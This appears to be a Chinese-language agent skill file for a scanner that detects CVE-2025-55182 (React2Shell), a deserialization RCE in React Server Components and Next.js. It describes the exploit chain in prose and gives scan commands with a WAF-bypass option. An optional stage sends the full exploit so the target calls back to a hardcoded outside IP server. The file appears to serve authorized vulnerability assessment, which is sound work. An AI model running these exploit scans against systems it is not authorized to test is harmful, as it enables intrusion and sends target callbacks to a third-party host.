---
name: react-vuln
description: "React/Next.js 漏洞检测插件集。用 plugins/ 下的插件对 React Server Components / Next.js 漏洞做高保真探测，当前内置 react2shell 插件：检测 CVE-2025-55182（React2Shell，RSC Flight 协议反序列化未授权 RCE，CVSS 10.0），双层探测——第一层安全错误旁路（不执行任何代码），第二层可选 OOB 带外回连确认（仅执行一行 http.get 回连，不执行命令）。触发场景：用户说「检测 react2shell」「React Server Components RCE」「CVE-2025-55182」「Next.js RCE 扫描」「React 漏洞检测」「react-vuln」，或给出目标 URL 要求探测 React/Next.js 反序列化 RCE 时使用。"
---

# React 漏洞检测插件集 (react-vuln)

插件式 React/Next.js 漏洞检测。每个插件一个目录，自带探测脚本；本 skill 只做注册表与调用约定。

## 插件注册表

| 插件 | 漏洞 | 入口脚本 | 依赖 |
|---|---|---|---|
| `react2shell` | CVE-2025-55182 React Server Components Flight 协议反序列化未授权 RCE（CVSS 10.0）。影响 `react-server-dom-{webpack,turbopack,parcel}` 19.0.0、19.1.0–19.1.1、19.2.0，即未修复的 Next.js App Router（< 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7）与自建 RSC；修复版本 19.0.1 / 19.1.2 / 19.2.1。CVE-2025-66478 已被 REJECTED，是本 CVE 的重复。 | `plugins/react2shell/poc.py` | `pip install requests cryptography` |

## 通用约定

- 默认只做**不执行代码的探测**（错误旁路判定）；`--oob` 确认模式也仅让目标回连
  interactsh（一行 Node `http.get`），不投递命令、不落文件。
- OOB 服务器（interactsh，裸 IPv4 + `-scan-everywhere` 模式）默认：`http://111.124.203.18:50050`。
  可用环境变量 `OOB_URL` 或 `--oob` 覆盖。
- 仅对已授权目标使用。

## react2shell 插件

原理：Next.js App Router 的 server action 端点（POST + `Next-Action` 头）会把 multipart
表单按 Flight 协议反序列化，且**反序列化发生在 action 校验之前**——`Next-Action` 头取任意值
即可触发，无需知道真实 action id。

- **第一层（safe 旁路，默认）**：引用链 `["$1:a:a"]` 在未修复 React 上按 `:` 逐层取属性且
  不检查键存在性：`{}.a.a` → `(undefined).a` 抛 TypeError → HTTP 500，响应 flight 错误行
  含 `E{"digest"`；补丁版本（19.0.1/19.1.2/19.2.1+）跳过不存在的键，不再 500。不执行任何代码。
- **第二层（`--oob` 确认）**：对第一层命中的目标发送完整利用链（`__proto__` 遍历取
  `Chunk.prototype.then` → 伪造 `resolved_model` chunk 二次解析 → `$B` blob 引用把
  `_prefix` 送进 `Function` 构造器并调用），但构造出的函数只执行一行 `http.get` 回连
  interactsh。收到带关联 id 的回连即 CONFIRMED。

### 准备

```bash
pip install requests cryptography
```

### 0) 自检 OOB 服务器（使用 --oob 前建议先跑）

```bash
cd <skill_root>/react-vuln/plugins/react2shell
python3 poc.py verify --oob http://111.124.203.18:50050
```

输出 `[+] OK: OOB server works end-to-end` 才继续。

### 1) 扫描

```bash
# 单目标（默认仅 safe 旁路，不执行任何代码）
python3 poc.py scan -t https://target.example.com/

# 多路径探测（根路径重定向到 /en 之类的场景；同 host 重定向会自动跟随）
python3 poc.py scan -t https://target.example.com --path / --path /en --path /login

# 目标列表（每行一个 URL）
python3 poc.py scan -f targets.txt

# safe 命中后用 OOB 回连做最终确认（报告取证推荐）
python3 poc.py scan -t https://target.example.com/ --oob http://111.124.203.18:50050

# 带鉴权头 / 代理 / WAF 绕过
python3 poc.py scan -t https://target.example.com/ \
  -H 'Cookie: session=...' -H 'Authorization: Bearer ...' \
  -x http://127.0.0.1:8080 --junk 128
```

常用参数：

| 参数 | 说明 |
|---|---|
| `-t URL` | 目标完整 URL，可重复 |
| `-f FILE` | 目标列表文件，每行一个 URL |
| `--path PATH` | 探测路径，可重复（默认 `/`） |
| `-H 'Name: Value'` | 附加请求头（可重复），用于鉴权后的服务 |
| `-x PROXY` | 目标流量走 http/https 代理 |
| `--oob URL` | 启用第二层 OOB 确认（默认只跑 safe 旁路） |
| `--junk KB` | body 前置随机垃圾字段，绕过只检查 body 头部的 WAF |
| `--timeout 10` | 单请求超时秒数 |
| `--wait 10s` / `--interval 2s` | OOB 回连轮询窗口 / 间隔（慢网络加大 `--wait`） |
| `-v` | 打印每条请求与响应细节 |

### 2) 结果判读

- `[+] VULNERABLE (confirmed OOB)`：OOB 回连到达 → 漏洞确认（附回连来源 IP 与请求行），
  可直接写报告。
- `[+] LIKELY VULNERABLE (safe side-channel)`：500 + `E{"digest"` 旁路命中。高保真但非
  100%（个别版本范围外配置也可能命中；Vercel/Netlify 等平台缓解已单独排除）——
  出报告前建议加 `--oob` 复测确认。
- `[i] mitigated`：目标在 Vercel/Netlify 等平台上有缓解，旁路特征被吞掉，不算发现。
- `not vulnerable`：无 RSC action 端点、已修复、或被 WAF 拦截；怀疑 WAF 时用
  `--junk 128` 复测。
- 退出码：`1` = 至少一个目标命中（confirmed 或 likely），`0` = 无命中（便于 CI/脚本）。

### 修复与缓解建议（写报告用）

- 升级 react 到 19.0.1 / 19.1.2 / 19.2.1+，或 Next.js 到
  15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7+。
- 临时缓解：WAF 拦截带 `Next-Action` 头且 body 含 `__proto__` / `$@` 引用的 multipart 请求；
  或下线 server actions（改用 API routes）。
- Vercel/Netlify 平台已内置缓解，但自建/自托管部署不受平台保护。

## 新增插件约定

在 `plugins/<name>/` 放入口脚本（建议单文件、`python3 poc.py --help` 自描述），
并在上方注册表登记：插件名、漏洞、入口脚本、依赖。保持「默认不执行代码、确认仅 OOB」原则。
